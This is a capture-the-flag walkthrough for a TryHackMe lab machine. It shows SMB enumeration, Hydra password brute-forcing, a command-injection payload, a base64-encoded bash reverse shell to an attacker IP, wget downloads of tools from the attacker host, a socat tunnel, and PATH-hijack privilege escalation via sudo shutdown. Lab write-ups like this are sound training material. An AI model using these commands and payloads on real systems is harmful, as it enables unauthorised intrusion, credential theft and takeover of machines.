# [Year of the Fox](https://tryhackme.com/room/yotf)

## Don't underestimate the sly old fox...

# Hack the machine and obtain the flags

## Can you get past the wily fox?

### What is the web flag?

1. First, perform a port scan to identify open services on the target machine.
   - This reveals several open ports including HTTP, SMB, and SSH

```bash
nmap <TARGET_IP>
```

[SCREEN01]

2. Check if SMB allows anonymous access and what shares are available

```bash
smbclient -L //<TARGET_IP> -N
```

[SCREEN02]

3. Use enum4linux to perform comprehensive SMB enumeration and gather user information
   - This reveals valuable information about users, shares, and system details. We discover potential usernames that can be used for further attacks

```bash
enum4linux -a <TARGET_IP>
```

[SCREEN03]

4. From our enumeration, we found a potential username `rascal`. Let's attempt to brute force the HTTP basic authentication
   - Discovered credentials: `rascal:shelley`

```bash
hydra -l rascal -P /root/Tools/wordlists/rockyou.txt <TARGET_IP> http-get / -I -t 64
```

[SCREEN04]

5.  Log in to `http://<TARGET_IP>/` using the discovered credentials. Use Burp Suite to intercept HTTP requests

[SCREEN05]

6. Through analysis of the web application, we identify a command injection vulnerability in the search functionality. We can exploit this to read the web flag

```
POST /assets/php/search.php HTTP/1.1
Host: <TARGET_IP>
Content-Length: 47
Authorization: Basic cmFzY2FsOnNoZWxsZXk=

{
  "target":"\"; cat ../../../web-flag.txt \n"
}
```

[SCREEN06]

---

### What is the user flag?

1. Now that we have command injection, let's establish a connection. Prepare a base64-encoded reverse shell payload

```bash
echo -n "bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1" | base64
```

2. Set up a netcat listener on our attacking machine to catch the reverse shell

```bash
nc -lvnp 4444
```

2. Use the command injection vulnerability to execute our base64-encoded reverse shell

```
POST /assets/php/search.php HTTP/1.1
Host: <TARGET_IP>
Content-Length: 47
Authorization: Basic cmFzY2FsOnNoZWxsZXk=

{
  "target":"\";echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4yMDMuNDYvNDQ0NCAwPiYx | base64 -d | bash; \""
}
```

3. Running `linpeas.sh` indicates that SSH is only available to localhost

```bash
cd /root/Tools/PEAS/linPEAS
python -m SimpleHTTPServer
```

```bash
cd /tmp
wget <ATTACKER_IP>:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

cat /etc/ssh/sshd_config
```

4. We can use socat to open another port and redirect the traffic to port 22 on localhost

```bash
cd /usr/bin
python -m SimpleHTTPServer
```

```bash
cd /tmp
wget <ATTACKER_IP>:8000/socat
chmod +x socat
./socat TCP-LISTEN:2222,fork TCP:127.0.0.1:22
```

5. Now we can brute force SSH credentials through our socat tunnel. Based on our enumeration, we try the username `fox`
   - Discovered credentials: `fox:batman`

```bash
hydra -l fox -P /root/Tools/wordlists/rockyou.txt ssh://<TARGET_IP>:2222
```

[SCREEN07]

6. With valid SSH credentials, we can now log in and retrieve the user flag

```bash
ssh fox@<TARGET_IP> -p 2222
cat /home/fox/user-flag.txt
```

[SCREEN08]

---

### What is the root flag?

1. Now that we have user access, check what sudo privileges the `fox` user has
   - This reveals that the `fox` user can run `/usr/sbin/shutdown` as root without a password, which we can exploit for privilege escalation

```bash
sudo -l
```

[SCREEN09]

2. We can exploit the sudo permission by hijacking the PATH to execute our own malicious `poweroff` command instead of the legitimate one

```bash
cd /tmp
cp /bin/bash /tmp/poweroff
chmod +x /tmp/poweroff
export PATH=/tmp:$PATH
sudo /usr/sbin/shutdown
```

[SCREEN10]

3. Now with root access, we can explore the system and find the root flag

```bash
cd /home/rascal
ls -la
cat cat .did-you-think-I-was-useless.root
```

[SCREEN11]
